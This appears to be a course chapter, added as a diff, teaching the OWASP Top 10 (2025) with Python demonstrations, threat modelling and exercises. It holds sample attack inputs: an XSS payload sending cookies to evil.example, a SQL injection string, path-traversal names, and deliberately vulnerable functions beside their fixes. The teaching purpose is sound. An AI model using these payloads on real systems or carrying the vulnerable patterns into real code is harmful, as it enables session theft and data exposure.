@@ -1,0 +1,294 @@
+---
+title: "Application security and the OWASP Top 10"
+summary: "The OWASP Top 10 (2025 edition), including supply-chain failures, how each is exploited and prevented, and threat modelling."
+prerequisites: [m-api-design]
+estimated_minutes: 240
+status: resources-verified
+---
+
+By the end of this chapter you will know the most common ways web applications are attacked, as catalogued by the OWASP Top 10 (2025 edition), how each attack works and how to prevent it in your code and configuration, and how to think like an attacker about your own designs with threat modelling. Security is not a separate phase or someone else's job: most vulnerabilities are ordinary bugs in ordinary code, and the defences are habits.
+
+The examples demonstrate attacks only against tiny, self-contained programs in this chapter. Testing anything you do not own without written permission is illegal in most countries.
+
+## Thinking about security
+
+A few principles run through everything below:
+
+- **Never trust input.** Everything from outside your process (request bodies, headers, cookies, query strings, file uploads, messages, even data from your own database that users originally typed) may be malicious. Validate it at the edge (<Ref to="m-errors" />) and treat it as data, never as code.
+- **Least privilege**: every user, service and process gets only the access it needs (<Ref to="m-cloud-iac" />, <Ref to="m-linux" />).
+- **Defence in depth**: several independent layers, so one mistake is not a breach.
+- **Secure defaults**: the safe option should be the default, and the dangerous one should need deliberate effort.
+- **Fail safely**: errors should deny access, not grant it, and should not leak internals (<Ref to="m-errors" />).
+
+## The OWASP Top 10 (2025)
+
+The **OWASP Top 10** (from the Open Worldwide Application Security Project) ranks the most critical web application security risks, using data from real applications and a community survey. The 2025 edition:
+
+1. **A01 Broken Access Control**
+2. **A02 Security Misconfiguration**
+3. **A03 Software Supply Chain Failures**
+4. **A04 Cryptographic Failures**
+5. **A05 Injection**
+6. **A06 Insecure Design**
+7. **A07 Authentication Failures**
+8. **A08 Software or Data Integrity Failures**
+9. **A09 Security Logging and Alerting Failures**
+10. **A10 Mishandling of Exceptional Conditions**
+
+### A01: Broken access control
+
+The most common serious flaw: users can act outside their permissions. Typical forms: changing an id in a URL to see someone else's order (**insecure direct object reference**, IDOR), calling an admin API without being an admin, modifying a field you should not (mass assignment, <Ref to="m-enterprise-patterns" />), and server-side request forgery (**SSRF**, below).
+
+```python
+ORDERS = {
+    7: {"owner": "c-17", "total": 5400, "address": "4 Park Row"},
+    8: {"owner": "c-4", "total": 900, "address": "9 Mill Lane"},
+}
+
+
+def get_order_vulnerable(current_user, order_id):
+    return ORDERS.get(order_id)
+
+
+def get_order(current_user, order_id):
+    order = ORDERS.get(order_id)
+    if order is None or (order["owner"] != current_user["id"] and "support" not in current_user["roles"]):
+        return None
+    return order
+
+
+ama = {"id": "c-17", "roles": []}
+support = {"id": "s-1", "roles": ["support"]}
+print("vulnerable, Ama asks for order 8:", get_order_vulnerable(ama, 8))
+print("fixed, Ama asks for order 8:", get_order(ama, 8))
+print("fixed, Ama asks for her own order 7:", get_order(ama, 7)["total"])
+print("fixed, support asks for order 8:", get_order(support, 8)["total"])
+```
+
+It prints the other customer's order (address included) from the vulnerable version, then `None` from the fixed one (the API should return 404, not revealing that the order exists), then 5400 for Ama's own order and 900 for the support agent. The rules: **check authorisation on every request, on the server, for the specific object**, not just "is logged in"; deny by default; use one central mechanism rather than checks scattered through handlers; and do not rely on unguessable ids, hidden buttons or client-side checks. <Ref to="m-identity" /> covers authorisation models.
+
+### A02: Security misconfiguration
+
+Default passwords, debug pages and stack traces in production, public storage buckets, unnecessary features enabled, missing security headers, verbose error messages, open admin consoles, and permissive CORS settings. Prevent it with hardened, repeatable configuration from code (<Ref to="m-cloud-iac" />), the same in every environment, policy checks in CI, and security headers on every response: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, and appropriate `Referrer-Policy` and frame restrictions.
+
+### A03: Software supply chain failures
+
+New in 2025's naming and ranked third: attacks through the code you did not write. Most of an application is dependencies, each with its own dependencies; a compromised or malicious package (typosquatted names, a hijacked maintainer account, a malicious update), a poisoned build tool, or a vulnerable library becomes your vulnerability.
+
+- **Lock and pin** dependency versions (`package-lock.json`, `pom.xml` with fixed versions, `packages.lock.json`), and install with `npm ci` so builds use exactly the locked versions.
+- **Scan dependencies** for known vulnerabilities and update them in small, regular steps (Dependabot, Renovate, <Ref to="m-static-quality" />).
+- **Prefer fewer, well-maintained dependencies**; check a package's maintainers, popularity and history before adding it.
+- **Generate an SBOM** (software bill of materials, in CycloneDX or SPDX format) so you can answer "are we affected?" within minutes when a new vulnerability is announced.
+- **Protect the pipeline**: pin third-party CI actions by commit hash, use least-privilege CI credentials (<Ref to="m-delivery" />), and **sign and verify artefacts** (Sigstore, <Ref to="m-containers" />). The SLSA framework describes levels of build integrity.
+
+### A04: Cryptographic failures
+
+Sensitive data exposed through missing or weak cryptography: plain HTTP, passwords stored with fast hashes, home-made encryption, hard-coded keys, deprecated algorithms (MD5, SHA-1 for signatures, DES), or no encryption at rest for sensitive data. <Ref to="m-crypto" /> covers what to use instead.
+
+### A05: Injection
+
+**Injection** happens when untrusted input is mixed into something that will be interpreted as code: SQL, shell commands, LDAP queries, HTML (cross-site scripting), template engines. The attacker's data becomes your instructions.
+
+```python
+import sqlite3
+
+db = sqlite3.connect(":memory:")
+
+
+def find_vulnerable(email):
+    return db.execute(f"SELECT id, email FROM customers WHERE email = '{email}'").fetchall()
+
+
+def find(email):
+    return db.execute("SELECT id, email FROM customers WHERE email = ?", (email,)).fetchall()
+
+
+def main():
+    db.execute("CREATE TABLE customers (id TEXT, email TEXT)")
+    db.executemany("INSERT INTO customers VALUES (?, ?)", [("c-17", "ama@example.com"), ("c-4", "kofi@example.com")])
+    attack = "x' OR '1'='1"
+    print("vulnerable, normal input:", find_vulnerable("ama@example.com"))
+    print("vulnerable, attack:", find_vulnerable(attack))
+    print("parameterised, attack:", find(attack))
+
+
+main()
+```
+
+It prints Ama's row for the normal input, then **every customer** for the attack (the input closed the quoted string and added `OR '1'='1'`, which is always true), then `[]` for the parameterised version, which treats the whole input as one value to compare. The rule is absolute: **never build queries by concatenating input**. Use parameters (`?`, `$1`, `@email`), or an ORM or query builder that does so. The same applies to shell commands (pass argument arrays, never a string through a shell) and to every other interpreter.
+
+**Cross-site scripting** (XSS) is injection into HTML: if a page includes user input without escaping it, an attacker's `<script>` runs in other users' browsers, stealing sessions or acting as them.
+
+```python
+import html
+
+review = '<img src=x onerror="fetch(`https://evil.example/?c=${document.cookie}`)">Lovely bread'
+print("unsafe:", f"<p>{review}</p>")
+print("escaped:", f"<p>{html.escape(review)}</p>")
+```
+
+It prints the review inserted raw (a working attack) and then escaped, with `<` turned into `&lt;` and quotes into `&quot;`, so the browser shows it as text. Modern frameworks (React, Angular, Razor, Thymeleaf) escape by default; the danger is the escape hatches (`dangerouslySetInnerHTML`, `v-html`, `Html.Raw`), building HTML by string concatenation, and user input in URLs (`javascript:` links). A strict **Content Security Policy** limits the damage if something slips through.
+
+### A06: Insecure design
+
+Flaws in the design itself, which perfect code cannot fix: no rate limit on a password reset endpoint, a checkout that trusts a price sent by the browser, a coupon that can be applied twice, a business flow that skips a step. Prevent them by **threat modelling** during design (below), writing abuse cases alongside use cases, and reusing reviewed designs for common needs.
+
+### A07: Authentication failures
+
+Weak passwords allowed, no protection against credential stuffing and brute force, sessions that do not expire or are not invalidated on logout, session ids in URLs, missing multi-factor authentication, and insecure password recovery. <Ref to="m-identity" /> covers sessions, tokens and OAuth; the short version: use a proven identity provider or framework, add MFA (passkeys are best), rate-limit and monitor login attempts, and check passwords against lists of breached passwords.
+
+### A08: Software or data integrity failures
+
+Trusting code or data whose integrity has not been checked: deserialising untrusted data into objects (a classic route to remote code execution in Java, .NET and Python's `pickle`), auto-updates without signature checks, accepting webhooks without verifying their signature (<Ref to="m-api-design" />), or trusting data a client sent back (a price, a role, a "paid" flag). Verify signatures, deserialise untrusted input only into simple data types (JSON into plain records), and keep authoritative data on the server.
+
+### A09: Security logging and alerting failures
+
+Attacks that are not logged cannot be detected or investigated. Log security-relevant events (logins and failures, access denied, permission changes, high-value transactions) with enough context, protect logs from tampering, alert on suspicious patterns, and practise responding (<Ref to="m-observability" />, <Ref to="m-reliability" />). Do not log secrets or sensitive personal data.
+
+### A10: Mishandling of exceptional conditions
+
+New in 2025: failing unsafely when something unexpected happens. Errors that skip an authorisation check, "fail open" logic that grants access when the policy service is down, partially completed transactions that leave data inconsistent, unhandled exceptions that expose stack traces, and resource exhaustion that crashes a service. Handle errors deliberately (<Ref to="m-errors" />): fail closed for security decisions, keep operations atomic (<Ref to="m-relational" />), and set limits on everything (request sizes, timeouts, rate limits, <Ref to="m-resilience" />).
+
+## Two attacks worth knowing in detail
+
+**Server-side request forgery** (SSRF, part of A01): a feature that fetches a URL the user supplies ("import a product image from this link") is tricked into requesting internal addresses, such as the cloud's metadata service (which can hand out credentials) or internal admin APIs. Defend with an allowlist of hosts where possible, and otherwise resolve the name and refuse private, loopback and link-local addresses, after following redirects:
+
+```python
+import ipaddress
+
+
+def allowed_target(resolved_ip):
+    ip = ipaddress.ip_address(resolved_ip)
+    return not (ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved or ip.is_multicast)
+
+
+for target in ["93.184.215.14", "10.20.81.17", "127.0.0.1", "169.254.169.254", "::1"]:
+    print(target, "->", "allowed" if allowed_target(target) else "blocked")
+```
+
+It prints `allowed` for the public address and `blocked` for the private network address, the loopback address, the cloud metadata address (169.254.169.254, link-local) and IPv6 loopback. Check the address you actually connect to, not just the name, because an attacker's domain can resolve to an internal address.
+
+**Path traversal**: a download endpoint that joins a user-supplied file name to a directory can be given `../../etc/passwd`. Resolve the final path and check it is still inside the allowed directory:
+
+```python
+from pathlib import Path
+
+UPLOADS = Path("/srv/shop/uploads").resolve()
+
+
+def safe_path(name):
+    candidate = (UPLOADS / name).resolve()
+    return candidate if candidate.is_relative_to(UPLOADS) else None
+
+
+for name in ["invoice-7.pdf", "2026/receipt.pdf", "../../../etc/passwd", "/etc/shadow"]:
+    print(name, "->", safe_path(name))
+```
+
+It prints the two genuine files inside `/srv/shop/uploads`, and `None` for both attacks: the `..` path and the absolute path both resolve outside the directory. Better still, never use user input as a path at all: store files under generated ids and look the name up in the database.
+
+**Cross-site request forgery** (CSRF): a malicious site makes the victim's browser send a request to your site, with the victim's cookies attached. Defences: `SameSite=Lax` or `Strict` cookies (the default in modern browsers for cookies without the attribute), anti-CSRF tokens in forms (frameworks provide them), and requiring custom headers or tokens for APIs.
+
+## Threat modelling
+
+**Threat modelling** asks, while designing (<Ref to="m-design-docs" />): what are we building, what can go wrong, what will we do about it, and did we do a good job? Draw the data flows and **trust boundaries** (where data crosses from less trusted to more trusted parts: the internet to your API, your API to a payment provider), then walk through each with a checklist. Microsoft's **STRIDE** is a common one:
+
+| Threat | Violates | Example | Typical defence |
+|---|---|---|---|
+| **S**poofing | authentication | logging in as someone else | strong authentication, MFA |
+| **T**ampering | integrity | changing a price in a request | server-side authority, signatures |
+| **R**epudiation | non-repudiation | "I never placed that order" | audit logs |
+| **I**nformation disclosure | confidentiality | reading others' orders | access control, encryption |
+| **D**enial of service | availability | flooding the login endpoint | rate limits, quotas |
+| **E**levation of privilege | authorisation | a customer reaching admin APIs | least privilege, checks per request |
+
+Record the threats found and the decisions taken, and revisit the model when the design changes. Combine it with security testing: static analysis (SAST) and dependency scanning in CI (<Ref to="m-static-quality" />), dynamic scanning (DAST) of running test environments, penetration tests for high-risk systems, and a responsible-disclosure policy (a `security.txt` file) so outsiders who find problems can tell you.
+
+## Common mistakes
+
+- **Authorisation checked only in the user interface**, or only "is logged in".
+- **Concatenating input into SQL, shell commands or HTML.**
+- **Trusting client-sent values** for prices, roles or permissions.
+- **Stack traces and debug pages in production.**
+- **Unpinned, unscanned dependencies** and over-privileged CI.
+- **Fail-open error handling** in security checks.
+- **Logging passwords or tokens**, or not logging security events at all.
+- **Security as a final review** instead of part of design and every pull request.
+
+## Practice
+
+**1. (warm-up)** Which OWASP 2025 category does each belong to? (a) Changing `/invoices/7` to `/invoices/8` shows another customer's invoice. (b) A malicious version of a popular npm package steals environment variables. (c) An unhandled exception in the permission service makes the gateway allow every request. (d) Passwords stored with unsalted SHA-1.
+
+<Solution>
+
+(a) A01 Broken Access Control. (b) A03 Software Supply Chain Failures. (c) A10 Mishandling of Exceptional Conditions. (d) A04 Cryptographic Failures.
+
+</Solution>
+
+**2. (warm-up)** Why does a parameterised query stop SQL injection, while escaping quotes by hand is fragile?
+
+<Solution>
+
+With parameters, the query's structure is sent and parsed separately from the values, so the database never interprets a value as SQL, whatever characters it contains. Hand escaping tries to neutralise dangerous characters in a string that is still parsed as SQL; it is easy to miss a case (different quote characters, encodings, numeric contexts without quotes), and one miss is a vulnerability.
+
+</Solution>
+
+**3. (standard)** Extend the access-control example so that support staff can read any order but only managers can refund one. Write `can(user, action, order)` and test four cases.
+
+<Solution>
+
+```python
+def can(user, action, order):
+    if action == "read":
+        return order["owner"] == user["id"] or "support" in user["roles"] or "manager" in user["roles"]
+    if action == "refund":
+        return "manager" in user["roles"]
+    return False
+
+
+order = {"owner": "c-17", "total": 5400}
+ama = {"id": "c-17", "roles": []}
+support = {"id": "s-1", "roles": ["support"]}
+manager = {"id": "m-1", "roles": ["manager"]}
+print(can(ama, "read", order), can(ama, "refund", order), can(support, "refund", order), can(manager, "refund", order))
+```
+
+It prints **True False False True**. Note the final `return False`: unknown actions are denied by default.
+
+</Solution>
+
+**4. (standard)** A product-import feature fetches an image from a URL the user enters. List the checks it needs.
+
+<Solution>
+
+Allow only `https` (and perhaps `http`) schemes; resolve the host name and refuse private, loopback, link-local and other internal addresses, checking the address actually connected to and every redirect target; ideally route outbound requests through a proxy that enforces this; set short timeouts and a maximum response size; check the content is really an image (by content, not just the header) before storing it; run the fetch with no credentials and no access to internal networks; log the requests.
+
+</Solution>
+
+**5. (stretch)** Threat-model a "forgot password" feature with STRIDE. Give one threat and one defence for at least four letters.
+
+<Solution>
+
+Spoofing: an attacker requests a reset for someone else and intercepts or guesses the token; defence: long random single-use tokens that expire within minutes, sent only to the registered address. Tampering: changing the user id in the reset form; defence: derive the user from the token on the server, never from the form. Repudiation: a user claims they never reset their password; defence: audit log of reset requests and completions, and an email notifying them. Information disclosure: the form says "no account with that email", revealing who has accounts; defence: the same response for every address. Denial of service: flooding someone's inbox with reset emails; defence: rate limits per account and per IP. Elevation of privilege: resetting an admin's password through a support tool; defence: extra verification and approval for privileged accounts, and invalidating all sessions after a reset.
+
+</Solution>
+
+<Exercises />
+
+## Summary
+
+- Never trust input; apply **least privilege**, **defence in depth**, secure defaults and failing safely.
+- **OWASP Top 10 (2025)**: broken access control, security misconfiguration, software supply chain failures, cryptographic failures, injection, insecure design, authentication failures, software or data integrity failures, security logging and alerting failures, mishandling of exceptional conditions.
+- Check **authorisation on every request** for the specific object; deny by default.
+- Prevent **injection** with parameters and escaping by default (SQL, shell, HTML); add a Content Security Policy.
+- Defend the **supply chain**: lock and scan dependencies, SBOMs, pinned CI actions, signed artefacts.
+- Guard against **SSRF**, **path traversal** and **CSRF** with allowlists, resolved-path checks and SameSite cookies.
+- **Threat-model** designs (STRIDE) and test continuously (SAST, dependency scanning, DAST, penetration tests).
+
+## Go deeper
+
+- [OWASP Top 10:2025](https://owasp.org/Top10/2025/), OWASP. The official list, with descriptions, examples and prevention for each category.
+- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/), OWASP. Concise defences for injection, XSS, SSRF, CSRF, authentication and much more.
+- [OWASP Application Security Verification Standard](https://owasp.org/www-project-application-security-verification-standard/), OWASP. A checklist of security requirements by level.
+- [Threat modeling](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats), Microsoft. STRIDE categories with examples and mitigations.
+- [SLSA](https://slsa.dev/), the Open Source Security Foundation. Levels of supply-chain integrity for builds.
